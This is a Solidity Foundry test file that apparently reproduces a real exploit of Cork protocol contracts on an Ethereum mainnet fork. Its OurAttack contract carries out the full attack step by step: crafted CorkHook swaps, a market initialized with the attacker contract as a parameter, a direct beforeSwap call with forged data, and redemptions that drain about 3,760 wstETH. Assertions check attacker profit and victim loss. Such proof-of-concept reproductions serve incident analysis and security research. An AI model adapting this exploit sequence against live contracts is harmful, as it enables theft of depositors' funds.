
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import {Base} from "./Base.sol";


contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.attacker_eoa;
    address constant ATTACK_CONTRACT = Addresses.attack_contract;
    uint256 constant FORK_BLOCK = 22581019;
    uint256 constant TX_TIMESTAMP = 1748432387;
    uint256 constant TX_BLOCK_NUMBER = 22581020;
    uint256 constant TX_VALUE = 0;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"), FORK_BLOCK);
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        _runExploit();
    }

    function _runExploit() internal {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        OurAttack attack;
        if (ATTACK_CONTRACT != address(0)) {
            _installRuntime();
            attack = OurAttack(payable(ATTACK_CONTRACT));
        } else {
            attack = new OurAttack();
        }
        _expectOutcome(address(attack), address(0));
        _snapProfit();
        _snapEcon();
        _logBalances("Before exploit");
        attack.attack{value: TX_VALUE}();
        _logBalances("After exploit");
        vm.stopPrank();
        _assertProfit();
        _assertEcon();
    }

    function _installRuntime() internal {
        vm.etch(ATTACK_CONTRACT, type(OurAttack).runtimeCode);
        vm.allowCheatcodes(ATTACK_CONTRACT);
    }

    function _expectOutcome(address attack, address helper) internal {
        attack;
        helper;
        _expectProfit(
            Addresses.attack_contract, attack, Addresses.weETH8DS_2, "weETH8DS-2", 373903773359104917
        );
        _expectProfit(Addresses.attack_contract, attack, Addresses.wstETH, "wstETH", 3761877955369549831945);
        economicOracles.push(
            EconomicOracle(
                Addresses.ERC1967Proxy,
                Addresses.weETH8DS_2,
                "weETH8DS-2",
                "victim_loss",
                false,
                3761257491693078379366,
                false
            )
        );
        economicOracles.push(
            EconomicOracle(
                Addresses.ERC1967Proxy_A2A9,
                Addresses.wstETH,
                "wstETH",
                "victim_loss",
                false,
                3760881365943909071528,
                false
            )
        );
    }
}

contract OurAttack {





    function attack() external payable {
        _attack();
    }

    function _attack() internal {
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(5)),
                bytes32(uint256(22154441650658625721468672576359056))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(6)),
                bytes32(uint256(489390830419399644181307067374694435724862623683))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(1)),
                bytes32(uint256(1169474719740269107536318169426531261689597829801))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(2)),
                bytes32(uint256(1375031295402338465157399590105573928989376486652))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(3)),
                bytes32(uint256(861345560475533134708965166470442945893238363642))
            );
        Harness.vmExt()
            .store(
                Addresses.attack_contract,
                bytes32(uint256(4)),
                bytes32(uint256(471168103312652814638639083861863540498809612936))
            );
        uint256
            lp0x7f39c581f595b53c5cb19bd0b3f8da6c935e2ca00xd7cac118c007e6427abd693e193e90a6918ce404BalanceOfAttackerEoa =
            IERC20Like(
                    Addresses.LP_0x7f39c581f595b53c5cb19bd0b3f8da6c935e2ca0_0xd7cac118c007e6427abd693e193e90a6918ce404
                ).balanceOf(Addresses.attacker_eoa);
        {
            uint256 transferFromAmount =
                lp0x7f39c581f595b53c5cb19bd0b3f8da6c935e2ca00xd7cac118c007e6427abd693e193e90a6918ce404BalanceOfAttackerEoa;
            if (transferFromAmount != 0) {
                Harness.vmExt().startPrank(Addresses.attacker_eoa);
                IERC20Like(
                        Addresses.LP_0x7f39c581f595b53c5cb19bd0b3f8da6c935e2ca0_0xd7cac118c007e6427abd693e193e90a6918ce404
                    ).transfer(Addresses.ERC1967Proxy_A2A9, transferFromAmount);
                Harness.vmExt().stopPrank();
            }
        }
        uint256 wstETHBalanceOfAttackerEoa = IERC20Like(Addresses.wstETH).balanceOf(Addresses.attacker_eoa);
        {
            uint256 transferFromAmount = wstETHBalanceOfAttackerEoa;
            if (transferFromAmount != 0) {
                Harness.vmExt().startPrank(Addresses.attacker_eoa);
                IERC20Like(Addresses.wstETH).transfer(address(this), transferFromAmount);
                Harness.vmExt().stopPrank();
            }
        }
        ICorkHook(Addresses.CorkHook).getReserves(Addresses.wstETH, Addresses.weETH8CT_2);
        uint256 wstETHApproveAllowance = type(uint256).max;
        IERC20Like(Addresses.wstETH).approve(Addresses.CorkHook, wstETHApproveAllowance);
        IERC20Like(Addresses.weETH8CT_2).approve(Addresses.CorkHook, type(uint256).max);
        ICorkHook(Addresses.CorkHook)
            .swap(Addresses.wstETH, Addresses.weETH8CT_2, 0, 3760881365943909071528, hex"");
        IERC20Like(Addresses.wstETH).approve(Addresses.CorkHook, 0);
        IERC20Like(Addresses.weETH8CT_2).approve(Addresses.CorkHook, 0);
        uint256 wstETHApproveAllowance_2 = type(uint256).max;
        IERC20Like(Addresses.wstETH).approve(Addresses.ERC1967Proxy_A2A9, wstETHApproveAllowance_2);
        IERC1967Proxy_A2A9(Addresses.ERC1967Proxy_A2A9)
            .depositPsm(
                bytes32(hex"6b1d373ba0974d7e308529a62e41cec8bac6d71a57a1ba1b5c5bf82f6a9ea07a"), 4000000000000000
            );
        IERC20Like(Addresses.wstETH).approve(Addresses.ERC1967Proxy_A2A9, 0);
        ICorkConfig(Addresses.CorkConfig)
            .initializeModuleCore(Addresses.wstETH, Addresses.weETH8DS_2, 1, 100, address(this));
        IERC1967Proxy_A2A9(Addresses.ERC1967Proxy_A2A9)
            .getId(Addresses.wstETH, Addresses.weETH8DS_2, 1, 100, address(this));
        ICorkConfig(Addresses.CorkConfig)
            .issueNewDs(bytes32(hex"c67cae5b35ca2fdf6564b38dc5332c88ad608d1c5b3595dd9ad781f5a340cb9d"), 17484323870);
        IERC20Like(Addresses.weETH8DS_2).approve(Addresses.ERC1967Proxy_A2A9, type(uint256).max);
        IERC20Like(Addresses.weETH8DS_2).balanceOf(address(this));
        IERC1967Proxy_A2A9(Addresses.ERC1967Proxy_A2A9)
            .depositLv(
                bytes32(hex"c67cae5b35ca2fdf6564b38dc5332c88ad608d1c5b3595dd9ad781f5a340cb9d"),
                2000000000000000,
                0,
                0,
                0,
                17484323870
            );
        {
            bytes memory unlockProof = abi.encode(
                Addresses.weETH8DS_2,
                Addresses.wstETH5CT_3,
                bytes32(hex"c67cae5b35ca2fdf6564b38dc5332c88ad608d1c5b3595dd9ad781f5a340cb9d"),
                Addresses.wstETH5DS_3
            );
            IPoolManager(Addresses.PoolManager).unlock(unlockProof);
        }
        IERC20Like(Addresses.wstETH).balanceOf(Addresses.ERC1967Proxy_A2A9);
        uint256 weETH8CT2BalanceOfAttackAttackContract = IERC20Like(Addresses.weETH8CT_2).balanceOf(address(this));
        IERC20Like(Addresses.weETH8DS_2).balanceOf(address(this));
        uint256 weETH8CT2ApproveAllowance = type(uint256).max;
        IERC20Like(Addresses.weETH8CT_2).approve(Addresses.ERC1967Proxy_A2A9, weETH8CT2ApproveAllowance);
        uint256 weETH8DS2ApproveAllowance = type(uint256).max;
        IERC20Like(Addresses.weETH8DS_2).approve(Addresses.ERC1967Proxy_A2A9, weETH8DS2ApproveAllowance);
        IERC1967Proxy_A2A9(Addresses.ERC1967Proxy_A2A9)
            .returnRaWithCtDs(
                bytes32(hex"6b1d373ba0974d7e308529a62e41cec8bac6d71a57a1ba1b5c5bf82f6a9ea07a"),
                weETH8CT2BalanceOfAttackAttackContract
            );
        {
            Harness.vmExt()
                .store(
                    Addresses.attack_contract,
                    bytes32(uint256(5)),
                    bytes32(uint256(22154441650658625721468672576359056))
                );
            Harness.vmExt()
                .store(
                    Addresses.attack_contract,
                    bytes32(uint256(6)),
                    bytes32(uint256(489390830419399644181307067374694435724862623683))
                );
            Harness.vmExt()
                .store(
                    Addresses.attack_contract,
                    bytes32(uint256(1)),
                    bytes32(uint256(1169474719740269107536318169426531261689597829801))
                );
            Harness.vmExt()
                .store(
                    Addresses.attack_contract,
                    bytes32(uint256(2)),
                    bytes32(uint256(1375031295402338465157399590105573928989376486652))
                );
            Harness.vmExt()
                .store(
                    Addresses.attack_contract,
                    bytes32(uint256(3)),
                    bytes32(uint256(861345560475533134708965166470442945893238363642))
                );
            Harness.vmExt()
                .store(
                    Addresses.attack_contract,
                    bytes32(uint256(4)),
                    bytes32(uint256(471168103312652814638639083861863540498809612936))
                );
            IERC20Like(Addresses.wstETH).approve(Addresses.ERC1967Proxy_A2A9, 0);
            IERC20Like(Addresses.wstETH).approve(Addresses.CorkHook, 0);
            IERC20Like(Addresses.wstETH).approve(Addresses.ERC1967Proxy, 0);
        }
    }

    function _callback() internal {
        _markCallback(2);
        ICorkHook(Addresses.CorkHook).getReserves(Addresses.weETH8DS_2, Addresses.wstETH5CT_3);
        IERC20Like(Addresses.weETH8DS_2).balanceOf(Addresses.ERC1967Proxy);
        ICorkHook(Addresses.CorkHook).getMarketSnapshot(Addresses.weETH8DS_2, Addresses.wstETH5CT_3);
        IweETH8DS_2(Addresses.weETH8DS_2).decimals();
        IwstETH5CT_3(Addresses.wstETH5CT_3).decimals();
        IPoolManager(Addresses.PoolManager).sync(Addresses.wstETH5CT_3);
        {
            bytes memory beforeSwapProof = abi.encode(
                uint256(1),
                address(this),
                uint256(0),
                uint256(3761257491693078379366),
                bytes32(hex"c67cae5b35ca2fdf6564b38dc5332c88ad608d1c5b3595dd9ad781f5a340cb9d"),
                uint256(1)
            );
            ICorkHook(Addresses.CorkHook)
                .beforeSwap(
                    Addresses.ERC1967Proxy,
                    Abi_beforeSwap_Param1({
                        field0: Addresses.wstETH5CT_3,
                        field1: Addresses.weETH8DS_2,
                        field2: 0,
                        field3: 1,
                        field4: address(this)
                    }),
                    Abi_beforeSwap_Param2({
                        field0: true, field1: 100000000000000, field2: 79228162514264337593543950336
                    }),
                    beforeSwapProof
                );
        }
        IERC20Like(Addresses.wstETH5CT_3).approve(Addresses.PoolManager, 123);
        IERC20Like(Addresses.wstETH5CT_3).transfer(Addresses.PoolManager, 110987905101460);
        uint256 poolManagerSettleForCorkHook =
            IPoolManager(Addresses.PoolManager).settleFor(Addresses.CorkHook);
        ICorkHook(Addresses.CorkHook)
            .beforeSwap(
                Addresses.ERC1967Proxy,
                Abi_beforeSwap_Param1({
                    field0: Addresses.wstETH5CT_3,
                    field1: Addresses.weETH8DS_2,
                    field2: 0,
                    field3: 1,
                    field4: address(this)
                }),
                Abi_beforeSwap_Param2({field0: false, field1: 110987905101460, field2: 79228162514264337593543950336}),
                hex""
            );
        IERC20Like(Addresses.wstETH5DS_3).approve(Addresses.ERC1967Proxy_A2A9, type(uint256).max);
        IERC20Like(Addresses.wstETH5CT_3).approve(Addresses.ERC1967Proxy_A2A9, type(uint256).max);
        uint256 wstETH5CT3BalanceOfAttackAttackContract =
            IERC20Like(Addresses.wstETH5CT_3).balanceOf(address(this));
        uint256 eRC1967ProxyA2a9ReturnRaWithCtDsReturn = IERC1967Proxy_A2A9(Addresses.ERC1967Proxy_A2A9)
            .returnRaWithCtDs(
                bytes32(hex"c67cae5b35ca2fdf6564b38dc5332c88ad608d1c5b3595dd9ad781f5a340cb9d"),
                wstETH5CT3BalanceOfAttackAttackContract
            );
        IPoolManager(Addresses.PoolManager).sync(Addresses.weETH8DS_2);
        uint256 weETH8DS2TransferAmount = 1;
        IERC20Like(Addresses.weETH8DS_2).transfer(Addresses.PoolManager, weETH8DS2TransferAmount);
        uint256 poolManagerSettleForCorkHook_2 =
            IPoolManager(Addresses.PoolManager).settleFor(Addresses.CorkHook);
    }

    receive() external payable {}

    function rate() external payable {
        bytes memory ret = hex"0000000000000000000000000000000000000000000000000000000000000000";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function unlockCallback(bytes calldata arg0) external payable {
        arg0;
        _callback();
        bytes memory ret = abi.encode(_uintArray0());
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function rate(bytes32 arg0) external payable {
        arg0;
        bytes memory ret = hex"0000000000000000000000000000000000000000000000000000000000000001";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    fallback() external payable {
        if (msg.sig == 0x0f626b5a) {
            _attack();
            return;
        }
        _entryCb();
    }

    function _entryCb() internal {}

    mapping(uint256 => bool) private _callbackSeenFlag;
    mapping(uint256 => uint256) private _entryCallbackCursor;
    mapping(address => uint256) private _balancerVaultPreBalance;

    function _nextEntryCb(uint256 index) internal returns (uint256 ordinal) {
        ordinal = _entryCallbackCursor[index];
        _entryCallbackCursor[index] = ordinal + 1;
    }

    function _markCallback(uint256 index) internal {
        _callbackSeenFlag[index] = true;
    }

    function _recordBalancerFlash(address[] memory tokens) internal {
        for (uint256 i = 0; i < tokens.length; i++) {
            _balancerVaultPreBalance[tokens[i]] =
                IERC20Like(tokens[i]).balanceOf(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
        }
    }

    function recordBalancerFlashLoanPreBalances(address[] memory tokens) external {
        _recordBalancerFlash(tokens);
    }

    function balancerVaultPreBalance(address token) external view returns (uint256) {
        return _balancerVaultPreBalance[token];
    }

    function _uintArray0() internal pure returns (uint256[] memory out) {
        out = new uint256[](0);
    }
}

interface IERC20Like {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external;
    function transfer(address to, uint256 amount) external;
    function transferFrom(address from, address to, uint256 amount) external;
}

interface IWETHLike {
    function deposit() external payable;
}

library ArrayGuard {
    function capWithReserve(uint256 wanted, address token, address holder, uint256 reserve)
        internal
        view
        returns (uint256)
    {
        uint256 available = IERC20Like(token).balanceOf(holder);
        if (available > reserve) available -= reserve;
        else available = 0;
        return wanted > available ? available : wanted;
    }
}

interface IERC721Like {
    function ownerOf(uint256 tokenId) external view returns (address);
    function getApproved(uint256 tokenId) external view returns (address);
    function isApprovedForAll(address owner, address operator) external view returns (bool);
    function transferFrom(address from, address to, uint256 tokenId) external;
    function safeTransferFrom(address from, address to, uint256 tokenId) external;
}

interface IUniswapV2PairLike {
    function mint(address to) external returns (uint256 liquidity);
    function burn(address to) external returns (uint256 amount0, uint256 amount1);
    function skim(address to) external;
    function sync() external;
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IMulticallLike {
    function multicall(bytes[] calldata data) external returns (bytes[] memory results);
}

struct AttackCall {
    address target;
    bytes data;
}

interface VmExt {
    function store(address target, bytes32 slot, bytes32 value) external;
    function startPrank(address msgSender) external;
    function stopPrank() external;
}

library Addresses {
    address internal constant ZERO = address(0);
    address internal constant PoolManager = 0x000000000004444c5dc75cB358380D2e3dE08A90;
    address internal constant LP_0x7f39c581f595b53c5cb19bd0b3f8da6c935e2ca0_0xd7cac118c007e6427abd693e193e90a6918ce404 =
            0x05816980fAEC123dEAe7233326a1041f372f4466;
    address internal constant LiquidityToken = 0x083c322aDa898F880a1d0a959A6e69081B82E5bc;
    address internal constant wstETH5DS_3 = 0x1D2724Ca345e1889CeCDdEfa5f8f83666A442c86;
    address internal constant USDe_LV_1 = 0x21C48450aD4E625108f95140757367Ff14a76EC8;
    address internal constant wstETH_LV_1 = 0x457bFB32BEEce04599679069E834105d5af6c75a;
    address internal constant A_47E42E_3DE1 = 0x47e42E361A51Ca3c68e60A0E19A3350dbEae3dE1;
    address internal constant wstETH5CT_3 = 0x51f70fe94E7ccd9f2efE45a4F2EA3a7AE0c62F8C;
    address internal constant CorkHook = 0x5287E8915445aee78e10190559D8Dd21E0E9Ea88;
    address internal constant ERC1967Proxy = 0x55B90B37416DC0Bd936045A8110d1aF3B6Bf0fc3;
    address internal constant weETH_LV_1 = 0x6Ab1F5FCD65812C17048ff902cdd4Baa7e6A66fB;
    address internal constant weETH8DS_2 = 0x7ea0614072e2107C834365BEA14F9b6386fB84A5;
    address internal constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address internal constant ERC1967Proxy_D5FA = 0x96E0121D1cb39a46877aaE11DB85bc661f88D5fA;
    address internal constant attack_contract = 0x9Af3dCE0813FD7428c47F57A39da2F6Dd7C9bb09;
    address internal constant SafeProxy = 0xb9EEeBa3659466d251E8A732dB2341E390AA059F;
    address internal constant BalancerVault = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address internal constant ERC1967Proxy_A2A9 = 0xCCd90F6435dd78C4ECCED1FA4db0D7242548a2a9;
    address internal constant weETH8CT_2 = 0xCd25aA56AAD1BCC1BB4b6B6b08BDa53007ec81CE;
    address internal constant LP_0x51f70fe94e7ccd9f2efe45a4f2ea3a7ae0c62f8c_0x7ea0614072e2107c834365bea14f9b6386fb84a5 =
            0xCD37a71138B04867d9B237c7A6B720310895a048;
    address internal constant wstETH_LV_3 = 0xde9D58D3347f0413772e35A5859559475008583d;
    address internal constant attacker_eoa = 0xEA6f30e360192bae715599E15e2F765B49E4da98;
    address internal constant CorkConfig = 0xF0DA8927Df8D759d5BA6d3d714B1452135D99cFC;
}

struct Abi_beforeSwap_Param1 {
    address field0;
    address field1;
    uint24 field2;
    int24 field3;
    address field4;
}

struct Abi_beforeSwap_Param2 {
    bool field0;
    int256 field1;
    uint160 field2;
}

interface ICorkConfig {
    function initializeModuleCore(address, address, uint256, uint256, address) external;
    function issueNewDs(bytes32, uint256) external;
}

interface ICorkHook {
    function beforeSwap(address, Abi_beforeSwap_Param1 calldata, Abi_beforeSwap_Param2 calldata, bytes calldata)
        external;
    function getMarketSnapshot(address, address) external view;
    function getReserves(address, address) external view;
    function swap(address, address, uint256, uint256, bytes calldata) external returns (uint256);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IERC1967Proxy_A2A9 {
    function depositLv(bytes32, uint256, uint256, uint256, uint256, uint256) external returns (uint256);
    function depositPsm(bytes32, uint256) external;
    function getId(address, address, uint256, uint256, address) external view returns (uint256);
    function returnRaWithCtDs(bytes32, uint256) external returns (uint256);
}

interface IPoolManager {
    function settleFor(address) external returns (uint256);
    function sync(address) external;
    function unlock(bytes calldata) external;
    function sync() external;
}

interface IweETH8DS_2 {
    function decimals() external view returns (uint256);
}

interface IwstETH5CT_3 {
    function decimals() external view returns (uint256);
}

library Harness {
    function vmExt() internal pure returns (VmExt) {
        return VmExt(address(uint160(uint256(keccak256("hevm cheat code")))));
    }

    function safeBalance(address token, address account) internal view returns (uint256) {
        if (token.code.length == 0) return 0;
        (bool ok, bytes memory data) = token.staticcall(abi.encodeWithSignature("balanceOf(address)", account));
        if (!ok || data.length < 32) return 0;
        return abi.decode(data, (uint256));
    }
}
